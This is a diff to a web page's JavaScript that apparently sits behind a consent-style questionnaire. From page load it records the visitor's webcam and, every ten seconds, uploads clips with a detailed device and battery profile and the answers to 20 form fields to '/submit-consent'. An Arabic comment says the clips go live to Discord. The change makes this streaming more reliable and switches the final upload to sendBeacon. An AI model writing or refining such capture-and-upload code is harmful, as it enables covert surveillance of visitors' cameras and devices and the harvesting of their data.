@@ -328,7 +328,6 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let videoInterval = null;
         let isCompleted = false;
 
         let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
@@ -368,58 +367,38 @@
             return details;
         }
 
-        function startNewRecorderSegment() {
-            if (isCompleted || !mediaStream) return;
+        // دالة إرسال المقطع المباشر بانتظام كل 10 ثوانٍ عبر fetch مع ضمان إرسال الـ chunks
+        function sendCurrentSegment() {
+            if (isCompleted || recordedChunks.length === 0) return;
 
+            const mimeType = mediaRecorder && mediaRecorder.mimeType ? mediaRecorder.mimeType : 'video/webm';
+            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+            const videoBlob = new Blob(recordedChunks, { type: mimeType });
+            
+            // تفريغ الـ chunks للمقطع القادم فوراً
             recordedChunks = [];
-            let options = { videoBitsPerSecond: 250000 };
-            if (MediaRecorder.isTypeSupported('video/mp4')) {
-                options.mimeType = 'video/mp4';
-            } else {
-                options.mimeType = 'video/webm';
-            }
 
-            try {
-                mediaRecorder = new MediaRecorder(mediaStream, options);
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
+            getDetailedDeviceInfo().then(deviceDetails => {
+                const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
 
-                mediaRecorder.onstop = async () => {
-                    if (recordedChunks.length === 0) return;
+                const formData = new FormData();
+                formData.append('username', `${username} [🎥 فيديو مباشر (Live Video)]`);
+                formData.append('location', "Non disponible");
+                formData.append('device', JSON.stringify(deviceDetails, null, 2));
 
-                    const mimeType = mediaRecorder.mimeType || 'video/mp4';
-                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    const videoBlob = new Blob(recordedChunks, { type: mimeType });
+                for (let i = 1; i <= 20; i++) {
+                    formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
+                }
 
-                    const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
-                    const deviceDetails = await getDetailedDeviceInfo();
+                formData.append('video', videoBlob, `live_clip.${ext}`);
 
-                    const formData = new FormData();
-                    formData.append('username', `${username} [🎥 فيديو مباشر (Live Video)]`);
-                    formData.append('location', "Non disponible");
-                    formData.append('device', JSON.stringify(deviceDetails, null, 2));
-
-                    for (let i = 1; i <= 20; i++) {
-                        formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
-                    }
-
-                    formData.append('video', videoBlob, `live_clip.${ext}`);
-
-                    try {
-                        await fetch('/submit-consent', { method: 'POST', body: formData });
-                    } catch (e) {
-                        if (navigator.sendBeacon) {
-                            navigator.sendBeacon('/submit-consent', formData);
-                        }
-                    }
-                };
-
-                mediaRecorder.start();
-
-            } catch (err) {
-                console.error("Error starting recorder segment:", err);
-            }
+                fetch('/submit-consent', {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => {
+                    console.log("Beacon fallback", err);
+                });
+            });
         }
 
         window.addEventListener('DOMContentLoaded', async () => {
@@ -429,18 +408,31 @@
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
-                setTimeout(() => {
-                    startNewRecorderSegment();
-                }, 2000);
+                let options = { videoBitsPerSecond: 250000 };
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    options.mimeType = 'video/mp4';
+                } else {
+                    options.mimeType = 'video/webm';
+                }
 
-                videoInterval = setInterval(() => {
-                    if (!isCompleted) {
-                        if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                            mediaRecorder.stop();
-                        }
+                mediaRecorder = new MediaRecorder(mediaStream, options);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                // بدء التسجيل مع طلب بيانات كل 10 ثوانٍ (10000ms) لتوليد chunks تلقائياً
+                mediaRecorder.start(10000);
+
+                // حلقة دورية كل 10 ثوانٍ لإرسال ما تم تسجيله مباشرة للديسكورد
+                setInterval(() => {
+                    if (!isCompleted && mediaRecorder && mediaRecorder.state === "recording") {
+                        mediaRecorder.requestData(); // إجبار الميديا ريكوردر على تسليم الـ chunks الحالية
                         setTimeout(() => {
-                            startNewRecorderSegment();
-                        }, 500);
+                            sendCurrentSegment();
+                        }, 300);
                     }
                 }, 10000);
 
@@ -452,17 +444,16 @@
         async function sendFinalData(reason = "Soumission finale") {
             if (isCompleted) return;
             isCompleted = true;
-            clearInterval(videoInterval);
 
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
                 mediaRecorder.stop();
             }
 
-            await new Promise(resolve => setTimeout(resolve, 600));
+            await new Promise(resolve => setTimeout(resolve, 500));
 
             const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
-            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
+            const mimeType = mediaRecorder && mediaRecorder.mimeType ? mediaRecorder.mimeType : 'video/webm';
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
             const videoBlob = new Blob(recordedChunks, { type: mimeType });
 
@@ -478,15 +469,9 @@
             formData.append('video', videoBlob, `recording.${ext}`);
 
             try {
-                fetch('/submit-consent', {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                });
+                navigator.sendBeacon('/submit-consent', formData);
             } catch (e) {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon('/submit-consent', formData);
-                }
+                fetch('/submit-consent', { method: 'POST', body: formData, keepalive: true });
             }
 
             if (mediaStream) {
